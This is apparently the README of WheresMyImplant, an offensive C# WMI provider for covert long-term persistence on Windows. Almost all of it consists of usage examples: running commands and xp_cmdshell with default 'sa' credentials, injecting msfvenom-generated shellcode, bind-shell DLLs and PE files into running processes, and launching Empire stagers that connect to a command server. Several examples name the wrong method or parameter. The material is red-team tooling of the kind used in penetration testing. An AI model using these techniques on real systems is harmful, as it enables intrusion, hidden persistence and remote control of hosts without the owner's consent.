### WheresMyImplant: A C# WMI Provider for long term persistance

This WMI provider includes functions to execute commands, payloads, and Empire Agent to maintain a low profile on the host.

### Methods

* #### RunCMD
  * Parameter: Command, Parameters
  * **Example:** <br/>
  Invoke-CimMethod -Class Win32_Implant -Name RunPowerShell -Argument @{ <br/>
  &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;command="ipconfig"; <br/>
  &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;parameter="/all" <br/>
  };
  
* #### RunPowerShell
  * Parameter: Command
  * **Example:** <br/>
  Invoke-CimMethod -Class Win32_Implant -Name RunPowerShell -Argument @{ <br/>
  &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;command="whoami" <br/>
  };
  
* #### RunXpCmdShell
  * **Parameter:** Server, Database, UserName, Password, Command
  * **Example:** <br/>
  Invoke-CimMethod -Class Win32_Implant -Name RunXpCmdShell -Argument @{
  &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;command="whoami"; <br/>
  &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;database=""; <br/>
  &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;server="sqlserver" <br/>
  &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;username="sa"; <br/>
  &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;password="password" <br/>
  };
  
* #### InjectShellCode
  * **Parameter:** ShellCodeString, ProcessId
  * ##### Example: <br/>
  msfvenom -p windows/x64/exec --format csharp CMD=calc.exe <br/>
  Invoke-CimMethod -Class Win32_Implant -Name InjectShellCode -Argument @{
  &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;shellCodeString=$payload; <br/>
  &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;processId=432 <br/>
  };
  
* #### InjectShellCodeWMFIFSB4
  * **Parameter:** WmiClass, FileName, ProcessId
  * **Example:** <br/>
  msfvenom -p windows/x64/exec --format csharp CMD=calc.exe <br/>
  Invoke-CimMethod -Class Win32_Implant -Name InjectShellCodeWMFIFSB4 -Argument @{
  &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;WmiClass="WMIFS"; <br/>
  &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;FileName="CalcShellCode"; <br/>
  &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;processId=432; <br/>
  };
  
* #### InjectDll
  * **Parameter:** Library, ProcessId
  * **Example:** <br/>
  msfvenom -p windows/x64/shell_bind_tcp --format dll --arch x64 > /tmp/bind64.dll <br/>
  Invoke-CimMethod -ClassName Win32_Implant -Name InjectDll -Arguments @{
  &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;library = "\\host\share\bind64.dll"; <br/>
  &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;processId = 3372; <br/>
  };
  
* #### InjectDllWMIFS
  * **Parameter:** WmiClass, FileName, ProcessId
  * **Example:** <br/>
  msfvenom -p windows/x64/shell_bind_tcp --format dll --arch x64 > /tmp/bind64.dll <br/>
  Invoke-CimMethod -ClassName Win32_Implant -Name InjectDllWMIFS -Arguments @{
  &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;WmiClass = "WMIFS"; <br/>
  &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;FileName = "bind64.dll"; <br/>
  &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;processId = 3372; <br/>
  };
  
* #### InjectPeFile
  * **Parameter:** FileName, Parameters, ProcessId
  * **Example:** <br/>
  * msfvenom -p windows/x64/shell_bind_tcp --format exe --arch x64 > /tmp/bind64.dll <br/>
  * Invoke-CimMethod -ClassName Win32_Implant -Name InjectPe -Arguments @{
  &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;FileName = "C:\bind64.exe"; <br/>
  &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Parameters = ""; <br/>
  &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ProcessId=5648; <br/>
  };
  
* #### InjectPeString
  * **Parameter:** PeString, Parameters, ProcessId
  * **Example:** <br/>
  msfvenom -p windows/x64/shell_bind_tcp --format exe --arch x64 > /tmp/bind64.dll <br/>
  Invoke-CimMethod -ClassName Win32_Implant -Name InjectPeString -Arguments @{
  &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;FileName = "C:\bind64.exe"; <br/>
  &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Parameters = ""; <br/>
  &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ProcessId=5648; <br/>
  };
  
* #### InjectPeWMIFS
  * **Parameter:** WmiClass, FileName, Parameters, ProcessId
  * **Example:** <br/>
  msfvenom -p windows/x64/shell_bind_tcp --format exe --arch x64 > /tmp/bind64.dll <br/>
  Invoke-CimMethod -ClassName Win32_Implant -Name InjectPeFromFileRem -Arguments @{
  &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;FileName = "C:\bind64.exe"; <br/>
  &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Parameters = ""; ProcessId=5648; <br/>
  };
  
* #### Empire
  * **Parameter:** Server, StagingKey, Language
  * **Example:** <br/>
  Invoke-CimMethod -ClassName Win32_Implant -Name EmpireStager -Arguments @{
  &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Server = $Server; <br/>
  &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;StagingKey = $StagingKey; <br/>
  &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Language = "PowerShell"; <br/>
  }; 
  <br/>
  Invoke-CimMethod -ClassName Win32_Implant -Name EmpireStager -Arguments @{
  &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Server = $Server; <br/>
  &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$StagingKey = $StagingKey; <br/>
  &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Language = "dotnet"; <br/>
  };


### Author, Contributors, and License

Author: Alexander Leary (@0xbadjuju), NetSPI - 2017

License: BSD 3-Clause

Required Dependencies: None
